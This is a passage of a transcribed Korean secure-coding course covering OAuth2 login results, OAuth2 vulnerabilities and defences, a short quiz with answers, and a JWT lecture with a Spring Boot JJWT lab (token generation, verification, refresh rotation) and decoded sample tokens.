OAuth2 Login 성공 - JSESSIONID 발급 완료                ← 빨간 박스
2025-02-27 16:46:04 WARN  FragmentProcessor:-1 - You don't need to put the layout:fragment/data-layout-fragment attribute into the <head> section - the dec…
```
(※ 검증: Python `http.cookies`로 `JSESSIONID=<id>; Path=/; HttpOnly; Secure` 파싱 확인 — 유효한 쿠키 문법. 단 `Secure` 속성은 HTTPS에서만 전송되므로 `http://localhost:8000` 실습 환경에서는 브라우저가 이 쿠키를 저장/전송하지 않을 수 있음(localhost 예외를 두는 브라우저도 있음). 또 서블릿 컨테이너가 `getSession(true)` 시 자체 JSESSIONID 쿠키를 함께 내려 보낼 수 있음)

---

## [2-SLIDES] 5주차 2차시 p.33 · OAuth2를 통한 로그인 성공 화면
OAuth2를 통한 로그인 성공 화면
〮 구글 로그인 성공하면, LAB 서비스의 test 계정으로 로그인 완료됨
〮 정보수정 화면에 들어가보면, 이름 항목에 구글계정 이름이 나타남

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 1 — 로그인 후 메인]** 탭 `클라이언트 – Google 인증 플랫…` / `시큐어코딩랩 - 메인`, 주소 `localhost:8000/board/main`
- 헤더: (주)오픈이지 로고, "안전한 소프트웨어를 만들기 위한 노력"
- 메뉴: 메인 · 게시판 · 시큐어코딩 테스트 · DB 초기화 / 오른쪽 **[ test 님 ]** · 로그아웃 · 정보수정 → test 계정으로 로그인된 상태
- 본문: "소프트웨어 보안은 보안소프트웨어를 뜻하는 것이 아닙니다. / 소프트웨어 라이프 사이클 전반에 걸쳐 안전한 소프트웨어 개발의 여러 모범사례를 적용하는 것을 의미합니다. / 보안문제는 특정 보안기능의 문제보다는 안전한 시스템을 구성하는 표준의 문제 때문에 발생할 가능성이 더 높습니다. / 그래서 소프트웨어 보안은 전체 개발단계 라이프 사이클의 접근 방식 중 하나가 되어야 합니다." + 『해킹 방어를 위한 JAVA 시큐어코딩』 책 표지 이미지

**[화면 캡처 2 — 정보수정]** 탭 `시큐어코딩랩 - 회원정보 수정`, 주소 `localhost:8000/member/modify`
- '회원정보 수정' 폼: **아이디 `test`**, **이름 (구글 계정 이름 — 파란 박스로 가림)** (두 행 빨간 박스) / 비밀번호 / 새 비밀번호 / 새 비밀번호 확인 / [재작성] [확인]
- 하단: Copyright © (주)오픈이지 2021-2025
- → 32쪽 `session.setAttribute("userName", nickname)`으로 구글 계정 이름이 이름 항목에 표시됨

---

## [2-SLIDES] 5주차 2차시 p.34 · OAuth2 인증 및 인가
OAuth2 인증 및 인가
01 OAuth2 이해
02 OAuth2 구현
03 OAuth2 보안 위협 및 해결 방법

---

## [2-SLIDES] 5주차 2차시 p.35 · OAuth2 구현시 발생할 수 있는 취약점
OAuth2 구현시 발생할 수 있는 취약점
〮 발생할 수 있는 취약점
〮 Redirect URI 검증 미흡
〮 State 파라미터 미사용
〮 PKCE 미적용
〮 주요 취약점 사례
〮 Authorization Code 탈취
- 중간자 공격(MITM)이나 오픈 리다이렉트 취약점을 이용해, 인증 코드가 탈취되어 부적절한 토큰 발급 위험
〮 Access Token 유출
- HTTPS 미적용, 불안전한 토큰 저장(예: 로컬 스토리지, 브라우저 캐시 등)으로 토큰 노출 가능
〮 토큰 재사용 및 리플레이 공격
- 만료되지 않은 토큰 또는 중복 요청 처리 미흡으로 인한 리플레이 공격, 부적절한 접근 권한 행사
〮 클라이언트 시크릿 관리 취약점
- 클라이언트 시크릿(Client Secret)이 공개 클라이언트에 노출될 경우, 악의적 사용자가 토큰 발급 시도 가능

---

## [2-SLIDES] 5주차 2차시 p.36 · Access Token 유출 방지 전략
Access Token 유출 방지 전략
〮 안전한 전송 및 저장
〮 HTTPS/TLS 적용
〮 보안 쿠키 사용
〮 토큰 관리 정책 강화
〮 짧은 유효기간
〮 Refresh Token 도입
〮 토큰 취소 및 재발급
〮 애플리케이션 보안 강화
〮 XSS 방어: 입력값 검증, 인코딩 및 CSP(Content Security Policy) 적용
〮 PKCE 사용: 공개 클라이언트의 경우, PKCE 도입으로 Authorization Code 탈취 방지

---

## [2-SLIDES] 5주차 2차시 p.37 · 요약 정리
요약 정리
OAuth2는 웹 및 애플리케이션 인증 및 권한 부여를 위한 개방형 표준 규격이다.
Access Token 유출을 방지하기 위해 HTTPS 적용, 보안 쿠키 사용, 토큰 만료 시간 설정 등의
조치를 취해야 한다.
OAuth2에서 발생할 수 있는 주요 취약점으로는 Redirect URI 검증 미흡, State 파라미터 미사용,
PKCE 미적용 등이 있다.

---

## [2-SLIDES] 5주차 2차시 p.38 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 5주차 2차시 p.39 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 5주차 2차시 p.40 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

1. 다음 중 OAuth2에 대한 설명으로 맞지 않는 것은?
   - 1) 인증과 인가를 분리한 프로토콜
   - 2) 제3자 애플리케이션이 사용자의 자원에 접근하도록 허용
   - 3) 토큰 기반 인증 사용
   - 4) 비밀번호를 통해 접근 권한을 위임

2. OAuth2의 구성 요소에 대한 설명 중 잘못된 것은?
   - 1) Resource Owner - 리소스 서비스 업체
   - 2) Resource Server - 보호된 리소스를 보유하고 있는 서버
   - 3) Authorization Server - 사용자 인증과 권한 부여처리, 액세스 토큰 발급
   - 4) Client Application - 보호된 리소스에 접근하려는 애플리케이션

3. Access Token 재발급을 위한 장기 인증 수단으로, 사용자 재로그인 없이 새로운 Access Token을 발급하기 위해 사용하는 Token의 이름은 무엇인가요? (영문 소문자만)
   - (                )

---

## [2-SLIDES] 5주차 2차시 p.41 · 퀴즈 정답
퀴즈 정답
1. 다음 중 OAuth2에 대한 설명으로 맞지 않는 것은?
4) 비밀번호를 통해 접근 권한을 위임
OAuth2는 기존 OAuth 1.0의 비밀번호 유출시 취약해질 수 있는 보안을 강화하기 위해 토큰 기반 인증을 사용합니다.
2. OAuth2의 구성 요소에 대한 설명 중 잘못된 것은?
1) Resource Owner - 리소스 서비스 업체
리소스에 대한 소유 또는 접근 권한을 가지고 있는 것은 사용자입니다.
3. Access Token 재발급을 위한 장기 인증 수단으로, 사용자 재로그인 없이 새로운 Access Token을 발급
하기 위해 사용하는 Token의 이름은 무엇인가요? (영문 소문자만)
( refresh )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(정답 표시: 1번 '4) 비밀번호를 통해 접근 권한을 위임', 2번 '1) Resource Owner - 리소스 서비스 업체', 3번 'refresh'가 빨간 글씨로 강조됨. 각 정답 아래 검은 글씨는 해설)

# [2-SLIDES] 5주차 3차시 — 인증과 인가 · OAuth2 · JWT
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · SameSite/세임사이트/Strict/Lax/None · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · JWT/JSON Web Token/제이더블유티/Claims/클레임/HS256/RS256/Refresh Token/리프레시 토큰 · Refresh Token/리프레시 토큰/토큰 회전/Rotation · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · localStorage/sessionStorage/로컬 저장소/로컬 스토리지/Same-Origin

## [2-SLIDES] 5주차 3차시 p.1 · JWT 인증 및 인가
JWT 인증 및 인가
01 JWT 이해
02 JWT 구현
03 JWT 보안 및 취약점 대응

---

## [2-SLIDES] 5주차 3차시 p.2 · 학습 목표
학습 목표
JWT 개념과 필요성을 이해하고 설명할 수 있다.
JWT 기반 인증 흐름을 이해하고, 구현할 수 있다.
JWT 보안 위협을 이해하고 이에 대한 해결 방안을 설명할 수 있다.

---

## [2-SLIDES] 5주차 3차시 p.3 · 학습 내용
학습 내용
1. JWT 개념
2. JWT 구현
3. JWT 보안 위협 및 해결방법

---

## [2-SLIDES] 5주차 3차시 p.4 · JWT 인증 및 인가
JWT 인증 및 인가
01 JWT 이해
02 JWT 구현
03 JWT 보안 및 취약점 대응

---

## [2-SLIDES] 5주차 3차시 p.5 · JWT(JSON Web Token) 이란?
JWT(JSON Web Token) 이란?
- JWT란?
JSON Web Token은 JSON 형식의 데이터를 안전하게 전송하기 위한 개방 표준(RFC 7519)입니다.
주로 인증(Authentication)과 인가(Authorization)에 사용되며, 클라이언트-서버 간 정보를 교환하는 용도로 활용됩니다.
- 주요 특징
- 자체 포함(Self-contained): 토큰 내에 사용자 정보, 만료 시간 등의 정보를 포함하여 별도 저장소 없이 인증 가능
- 경량(Compact): URL, 헤더, 쿠키 등 다양한 환경에서 전송하기 적합한 크기
- 서명(Signature): 토큰의 위변조 여부를 확인하기 위해 HMAC, RSA, ECDSA 등의 알고리즘으로 서명

---

## [2-SLIDES] 5주차 3차시 p.6 · JWT의 구성 및 동작 방식
JWT의 구성 및 동작 방식
- JWT 구성 요소
- 헤더(Header)
토큰의 타입(JWT)과 서명에 사용할 알고리즘 정보(예: HS256, RS256) 포함
- 페이로드(Payload)
- 인증 관련 정보(클레임, claims) 포함
- 표준 클레임: iss(발급자), exp(만료시간), sub(주체), aud(대상) 등
- 커스텀 클레임: 애플리케이션별 추가 데이터
- 서명(Signature)
헤더와 페이로드를 비밀 키로 서명하여 위변조 방지
출처: https://blog.knoldus.com/json-web-token-jwt-a-complete-guide/
- 동작 원리
클라이언트는 인증 후 JWT를 발급받아 이후 요청할 때마다 포함
서버는 JWT의 서명을 검증하여 토큰의 유효성을 확인한 후, 페이로드 내 정보를 기반으로 권한을 부여

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[오른쪽 그림: JWT 구조 도식 (출처: knoldus 블로그)]**
상단에 "JWT / JSON WEB TOKEN" 로고와 노란 열쇠 그림, 그 아래 세 개의 색 상자가 "+"로 연결됨.

- **HEADER** (ALGORITHM & TOKEN TYPE) — 초록 상자
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
- **+ PAYLOAD** (DATA) — 분홍 상자
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
```
- **+ SIGNATURE** (VERIFICATION) — 파랑 상자
```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),secretKey)
```
(※ 검증: Python으로 확인 — 헤더 {"alg":"HS256","typ":"JWT"}의 Base64URL 인코딩은 `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`로, JWT 헤더의 표준 형태와 일치)

---

## [2-SLIDES] 5주차 3차시 p.7 · JWT의 장점
JWT의 장점
- 무상태성 (Stateless & Self-contained)
서버에 별도의 세션 저장소가 필요 없어, 확장성과 분산 시스템에 적합
- 빠른 검증 및 성능
JWT는 자체에 모든 정보를 포함하므로, 데이터베이스 조회 없이도 신원 검증 가능
- 유연한 클레임 구조
표준 클레임 외에도 애플리케이션 맞춤형(claims) 데이터를 포함할 수 있어 다양한 정보 교환이 용이
- 표준 기반
RFC 7519에 의해 정의되어 다양한 플랫폼과 언어에서 지원 및 호환성 보장

---

## [2-SLIDES] 5주차 3차시 p.8 · JWT의 단점
JWT의 단점
- 정보 노출 문제
기본적으로 Base64 인코딩되어 있으므로, 암호화하지 않으면 누구나 페이로드 내용을 확인할 수 있음
- 토큰 탈취 위험
토큰 자체에 중요한 정보가 포함되어 있으며, 만료 기간 동안 노출 시 악용 가능 (HTTPS 등 전송 보안 필요)
- 토큰 무효화의 어려움
발급된 JWT는 만료 전까지 유효하므로, 탈취 시 빠른 무효화가 어렵고 재발급 관리가 복잡
- 크기 및 오버헤드
여러 클레임을 포함할 경우 토큰 크기가 커져 전송 오버헤드가 발생할 수 있음

---

## [2-SLIDES] 5주차 3차시 p.9 · JWT 기반 인증 흐름
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

JWT를 이용한 로그인 및 액세스 토큰 발급 과정

**[도식: 시퀀스 다이어그램]** 왼쪽에 주황색 세로 상자 "사용자 Client", 그 왼쪽 위에 회색 원통(저장소) 아이콘, 오른쪽에 파란색 세로 상자 "서버". 두 상자 사이에 가로 화살표(주황 = 사용자→서버 요청, 파랑 = 서버→사용자 응답).

| 순서 | 방향 | 내용 |
|---|---|---|
| ① | 사용자 → 서버 | ID, PWD 로그인 요청 |
| ② | 서버 → 사용자 | JWT 기반 Access Token, Refresh Token 발급 |
| ③ | 사용자(클라이언트 내부) | Local Storage에 JWT 저장 (원통 아이콘) |
| ④ | 사용자 → 서버 | Access Token으로 API 요청 |
| ⑤ | 서버 → 사용자 | Access Token 문제 없으면 정보 제공 |
| ⋮ | | (세로 점선: 시간 경과 — Access Token 만료 후) |
| ⓐ | 사용자 → 서버 | Refresh Token으로 Access Token 재발급 |
| ⓑ | 서버 → 사용자 | Refresh Token 문제 없으면 Access Token 재발급 |

(※ 참고: 이 도식은 ③에서 JWT를 Local Storage에 저장하지만, 26쪽 'JWT 탈취'에서는 로컬 스토리지 저장을 악성 코드에 의한 유출 위험(불안전한 저장소)으로 설명하고, 11쪽은 HttpOnly/Secure 쿠키를 권장함)

---

## [2-SLIDES] 5주차 3차시 p.10 · JWT 기반 인증 흐름
JWT 기반 인증 흐름
- JWT를 활용한 사용자 인가 및 권한 관리
- 토큰 내 클레임(Claims) 활용
JWT 페이로드에 사용자 식별자, 역할(role), 권한(permission) 등의 정보를 포함
클라이언트는 인증 후 JWT를 발급받아, 이후 요청 시 HTTP 헤더에 포함 ("Bearer <token>")
- 서버 측 검증 및 인가 과정
서버는 JWT의 서명, 만료시간, 발급자 등을 검증하여 토큰의 무결성 확인
페이로드의 클레임을 기반으로 사용자의 접근 권한 및 인가 결정
예) 특정 API에 접근하기 위해 필요한 역할 또는 권한이 JWT 클레임에 포함되어 있는지 확인
- 무상태(Stateless) 인증
서버는 별도의 세션 저장소 없이, JWT 내 정보를 활용하여 인가를 수행
분산 시스템 및 마이크로서비스 환경에서 효과적
- 토큰 만료 및 갱신
짧은 만료 시간 설정으로 권한 변경 시 빠른 반영 가능
Refresh Token과 토큰 회전 전략을 통해, 오래된 권한 정보를 가진 토큰 사용 방지

---

## [2-SLIDES] 5주차 3차시 p.11 · JWT 기반 인증 흐름
JWT 기반 인증 흐름
- JWT를 활용한 사용자 인가 및 권한 관리 사용시 고려사항
- 동적 권한 관리의 한계 및 보완
사용자 권한 변경 시, 기존 JWT에 반영되지 않으므로 주기적 토큰 갱신 또는 별도 인가 체크 필요
중앙 인가 서버와의 연계를 통해 실시간 권한 업데이트 구현 고려
- 보안 강화
HTTPS를 통한 안전한 전송, HttpOnly/ Secure 쿠키 등 안전한 저장소 활용
최소한의 정보만 포함하고, 민감 정보는 별도 암호화 또는 안전한 관리

---

## [2-SLIDES] 5주차 3차시 p.12 · JWT 인증 및 인가
JWT 인증 및 인가
01 JWT 이해
02 JWT 구현
03 JWT 보안 및 취약점 대응

---

## [2-SLIDES] 5주차 3차시 p.13 · JWT 구현 실습
JWT 구현 실습
- hello-spring-boot 프로젝트에 기능 추가하여 실습
Spring Boot 기본 사용법 설명에서 실습하였던 프로젝트 활용
Java 17 / Maven 환경
- 실습 내용
- Access Token과 Refresh Token의 생성
- Access Token의 검증
- Refresh Token을 이용하여 새로운 Access Token과 Refresh Token 재발급

---

## [2-SLIDES] 5주차 3차시 p.14 · 프로젝트 환경 설정
프로젝트 환경 설정
- pom.xml 의 Dependency 목록에 JWT 라이브러리(JJWT)를 추가함
- jjwt-api : 관련 API 정의
- jjwt-impl : 실제 API 동작 구현
- jjwt-Jackson : Jackson 라이브러리 연동으로 JSON 처리

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[오른쪽 캡처: Eclipse에서 연 pom.xml (줄 28~58), 빨간 박스로 줄 32~54 `<dependencies>` 블록 강조]**
```xml
    </scm>
    <properties>
        <java.version>17</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-api</artifactId>
            <version>0.11.5</version>
        </dependency>
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-impl</artifactId>
            <version>0.11.5</version>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-jackson</artifactId>
            <version>0.11.5</version>
            <scope>runtime</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
```
- 줄 31 `</properties>`는 빨간 박스 윗변에 가려 일부만 보임 (판독 확신 낮음 — 구조상 `</properties>`).
- 줄 58 `<plugin>` 이하는 캡처에서 잘림.
- jjwt-api는 compile 범위(기본), jjwt-impl·jjwt-jackson은 `<scope>runtime</scope>`, 세 라이브러리 모두 버전 0.11.5.
- (※ 원문 표기 그대로 — 본문은 "jjwt-Jackson"으로 표기했으나 실제 artifactId는 소문자 `jjwt-jackson`)

---

## [2-SLIDES] 5주차 3차시 p.15 · JWT 컨트롤러 소스코드 (1/4)
JWT 컨트롤러 소스코드 (1/4)
- 상수값 설정
- secretKey : HS256 암호화 비밀 키
- ACCESS_TOKEN_EXPIRATION : 10분
- REFRESH_TOKEN_EXPIRATION : 30분
JwtController.java

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[오른쪽 캡처: JwtController.java 줄 1~28]**
```java
package com.example.hellospringboot.controller;

import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.crypto.SecretKey;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/jwt")
public class JwtController {

    // HS256 알고리즘에 적합한 안전한 비밀키 생성
    private final SecretKey secretKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);

    // 토큰 만료 시간 (Access: 10분, Refresh: 30분)
    private final long ACCESS_TOKEN_EXPIRATION = 10 * 60 * 1000;
    private final long REFRESH_TOKEN_EXPIRATION = 30 * 60 * 1000;

```
(※ 검증: Python으로 확인 — 10 * 60 * 1000 = 600,000ms = 10분, 30 * 60 * 1000 = 1,800,000ms = 30분으로 본문 설명과 일치)
(※ 참고: `Keys.secretKeyFor(SignatureAlgorithm.HS256)`는 실행 시마다 256비트 난수 키를 새로 만들므로, 애플리케이션을 재시작하면 이전에 발급한 토큰은 모두 서명 검증에 실패함)

---

## [2-SLIDES] 5주차 3차시 p.16 · JWT 컨트롤러 소스코드 (2/4)
JWT 컨트롤러 소스코드 (2/4)
- 엔드포인트 구현
- /jwt/generate :Access Token, Refresh Token 생성
- Access Token 생성 과정
- setSubject("test-user"): 사용자 식별 정보
- setIssuer("example.com"): 토큰 발급자
- setIssuedAt(new Date()): 발급 시각
- setExpiration(new Date(…)): 만료 시간 설정
- claim("role", "user"): 추가 클레임 (예: 사용자 권한)
- signWith(secretKey): 비밀키로 서명
- Refresh Token 생성
JwtController.java
기본 정보 외에 claim("tokenType", "refresh") 추가로 토큰 구분

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[오른쪽 캡처: JwtController.java 줄 28~60 — /jwt/generate]**
```java

    /**
     * Access Token과 Refresh Token을 함께 생성하여 반환합니다.
     * URL: /jwt/generate
     */
    @GetMapping("/generate")
    public Map<String, String> generateTokens() {
        // Access Token 생성
        String accessToken = Jwts.builder()
                .setSubject("test-user")
                .setIssuer("example.com")
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + ACCESS_TOKEN_EXPIRATION))
                .claim("role", "user")
                .signWith(secretKey)
                .compact();

        // Refresh Token 생성 (tokenType 클레임을 추가하여 구분)
        String refreshToken = Jwts.builder()
                .setSubject("test-user")
                .setIssuer("example.com")
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + REFRESH_TOKEN_EXPIRATION))
                .claim("tokenType", "refresh")
                .signWith(secretKey)
                .compact();

        Map<String, String> tokens = new HashMap<>();
        tokens.put("accessToken", accessToken);
        tokens.put("refreshToken", refreshToken);
        return tokens;
    }

```
- Access Token에는 `role: user` 클레임, Refresh Token에는 `role` 대신 `tokenType: refresh` 클레임이 들어감.

---

## [2-SLIDES] 5주차 3차시 p.17 · JWT 컨트롤러 소스코드 (3/4)
JWT 컨트롤러 소스코드 (3/4)
- 엔드포인트 구현
/jwt/verify : Access Token 유효성 검증
JwtController.java

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[캡처: JwtController.java 줄 61~79 — /jwt/verify, 줄 69의 `secretKey`가 IDE 선택 강조(회색 배경)]**
```java
    /**
     * 전달받은 Access Token의 유효성을 검증하고 클레임 정보를 반환합니다.
     * URL: /jwt/verify?token={토큰}
     */
    @GetMapping("/verify")
    public ResponseEntity<?> verifyAccessToken(@RequestParam String token) {
        try {
            Claims claims = Jwts.parserBuilder()
                    .setSigningKey(secretKey)
                    .build()
                    .parseClaimsJws(token)
                    .getBody();

            return ResponseEntity.ok(claims);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Invalid Token: " + e.getMessage());
        }
    }

```
- 서명·만료 검증에 실패하면 예외가 발생하고, catch 블록에서 HTTP 400(badRequest)과 "Invalid Token: " + 예외 메시지를 반환.

---

## [2-SLIDES] 5주차 3차시 p.18 · JWT 컨트롤러 소스코드 (4/4)
JWT 컨트롤러 소스코드 (4/4)
- 엔드포인트 구현
/jwt/refresh : Refresh Token이 유효할 경우 새로운 Access Token과 Refresh Token을 발급
이전 Refresh Token 재사용을 방지하려면 서버 측에서 DB나 캐시를 활용해야 함
JwtController.java

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[캡처 2개: JwtController.java 줄 80~111(왼쪽), 줄 112~131(오른쪽) — /jwt/refresh]**
```java
    /**
     * Refresh Token을 사용하여 새로운 Access Token과 Refresh Token을 발급합니다.
     * URL: /jwt/refresh?refreshToken={RefreshToken}
     */
    @GetMapping("/refresh")
    public ResponseEntity<?> refreshAccessToken(@RequestParam String refreshToken) {
        try {
            // 최신 방식의 파서를 사용하여 Refresh Token 검증
            Claims claims = Jwts.parserBuilder()
                    .setSigningKey(secretKey)
                    .build()
                    .parseClaimsJws(refreshToken)
                    .getBody();

            // tokenType 클레임을 확인하여 실제 Refresh Token인지 검증
            String tokenType = (String) claims.get("tokenType");
            if (tokenType == null || !tokenType.equals("refresh")) {
                return ResponseEntity.badRequest().body("Invalid Token type !");
            }

            // (선택 사항) DB나 캐시 등에서 기존 토큰 상태를 확인하여 이전 토큰 재사용을 방지하는 로직 추가 가능

            // 새로운 Access Token 생성
            String newAccessToken = Jwts.builder()
                    .setSubject(claims.getSubject())
                    .setIssuer("example.com")
                    .setIssuedAt(new Date())
                    .setExpiration(new Date(System.currentTimeMillis() + ACCESS_TOKEN_EXPIRATION))
                    .claim("role", "user")
                    .signWith(secretKey)
                    .compact();

            // Refresh Token Rotation: 새로운 Refresh Token 발급
            String newRefreshToken = Jwts.builder()
                    .setSubject(claims.getSubject())
                    .setIssuer("example.com")
                    .setIssuedAt(new Date())
                    .setExpiration(new Date(System.currentTimeMillis() + REFRESH_TOKEN_EXPIRATION))
                    .claim("tokenType", "refresh")
                    // 필요 시 고유 토큰 ID 부여 로직 추가 (ex. .setId(newUniqueTokenId()))
                    .signWith(secretKey)
                    .compact();

            Map<String, String> tokens = new HashMap<>();
            tokens.put("accessToken", newAccessToken);
            tokens.put("refreshToken", newRefreshToken);
            return ResponseEntity.ok(tokens);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Invalid Refresh Token: " + e.getMessage());
        }
    }
}
```
- 왼쪽 캡처 맨 위 줄 79는 잘려 있음(17쪽 끝의 빈 줄). 줄 101, 111은 빈 줄.
- tokenType 검사 덕분에 Access Token(tokenType 없음)을 /jwt/refresh에 넣으면 "Invalid Token type !"으로 거부됨.
- 기존 Refresh Token을 무효화하는 로직은 없으므로(주석으로만 '선택 사항' 언급) 이전 Refresh Token도 만료 전까지는 계속 재사용 가능 — 본문 "이전 Refresh Token 재사용을 방지하려면 서버 측에서 DB나 캐시를 활용해야 함"의 이유.

---

## [2-SLIDES] 5주차 3차시 p.19 · 구현된 JWT 기능 테스트 (1/3)
구현된 JWT 기능 테스트 (1/3)
- Access Token 발급 시험
실제 환경에서는 사용자 인증 성공한 사용자에 대해서만 처리되어야 함
웹 브라우저에서 http://localhost:8080/jwt/generate 입력
JSON 형식으로 accessToken, refreshToken 값이 반환됨
파이어폭스 브라우저의 경우 결과 화면에서 '원시값 보기' 선택

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[캡처: 브라우저 원시값(raw) 응답 — "accessToken", "refreshToken" 키 부분이 빨간 박스로 강조]**
```json
{"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0LXVzZXIiLCJpc3MiOiJleGFtcGxlLmNvbSIsImlhdCI6MTc0MTA3MzM3MCwiZXhwIjoxNzQxMDczOTcwLCJyb2xlIjoidXNlciJ9.dpP1yQXho7dtZmGoDBoeizGNGtQ7g05RJSike1vcpwY","refreshToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0LXVzZXIiLCJpc3MiOiJleGFtcGxlLmNvbSIsImlhdCI6MTc0MTA3MzM3MCwiZXhwIjoxNzQxMDc1MTcwLCJ0b2tlblR5cGUiOiJyZWZyZXNoIn0.mLjZs-iZ9xH67IoCm7F_Ktie6LmdMsUaU_8B59VEuB8"}
```
- 캡처에서는 6줄로 줄바꿈되어 있고, 2·4번째 줄 일부가 빨간 박스에 가려 있음. 가려진 부분은 보이는 앞뒤 글자와 20쪽에서 복원된 클레임을 Base64URL로 다시 인코딩해 맞춤.
- 서명 부분(세 번째 조각)은 키 없이 검증할 수 없으므로 I/l, O/0처럼 헷갈리는 글자는 (판독 확신 낮음).

디코딩 결과:
- Access Token 헤더 `{"alg":"HS256"}` / 페이로드 `{"sub":"test-user","iss":"example.com","iat":1741073370,"exp":1741073970,"role":"user"}`
- Refresh Token 헤더 `{"alg":"HS256"}` / 페이로드 `{"sub":"test-user","iss":"example.com","iat":1741073370,"exp":1741075170,"tokenType":"refresh"}`

(※ 검증: Python으로 확인 — 위 페이로드를 다시 인코딩한 값이 캡처에 보이는 글자와 일치. Access exp−iat = 600초(10분), Refresh exp−iat = 1800초(30분)로 코드의 상수와 일치. iat 1741073370 = 2025-03-04 16:29:30 KST. 서명은 각각 43자 = 32바이트(HS256 출력 길이)와 일치)
(※ 참고: JJWT 0.11.5가 만든 헤더는 `{"alg":"HS256"}`뿐이고 `"typ":"JWT"`가 없음 — 6·23쪽 예시 헤더와 다름)

---

## [2-SLIDES] 5주차 3차시 p.20 · 구현된 JWT 기능 테스트 (2/3)
구현된 JWT 기능 테스트 (2/3)
- Access Token 유효 확인 시험
Access Token의 유효성 및 클레임 내용 확인
웹 브라우저에서 http://localhost:8080/jwt/verify?token=액세스토큰값 입력
토큰이 유효할 경우 JSON 형식으로 토큰 안에 들어있는 클레임 정보 반환됨
잘못된 토큰일 경우 HTTP 400 응답으로 에러 메시지가 반환됨
< 토큰이 유효할 경우 >
< 잘못된 토큰일 경우 >

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[캡처 1: 토큰이 유효할 경우 — 브라우저 응답]**
```json
{"sub":"test-user","iss":"example.com","iat":1741073370,"exp":1741073970,"role":"user"}
```
**[캡처 2: 잘못된 토큰일 경우 — 브라우저 응답(HTTP 400)]**
```
Invalid Token: JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.
```
(※ 검증: Python으로 확인 — 이 클레임은 19쪽 accessToken 페이로드를 디코드한 값과 같음. iat 1741073370 = 2025-03-04 16:29:30 KST, exp 1741073970 = 16:39:30 KST로 10분 차이. 에러 문구는 코드 줄 76의 접두어 "Invalid Token: "에 JJWT 서명 불일치 예외 메시지가 붙은 형태)

---

## [2-SLIDES] 5주차 3차시 p.21 · 구현된 JWT 기능 테스트 (3/3)
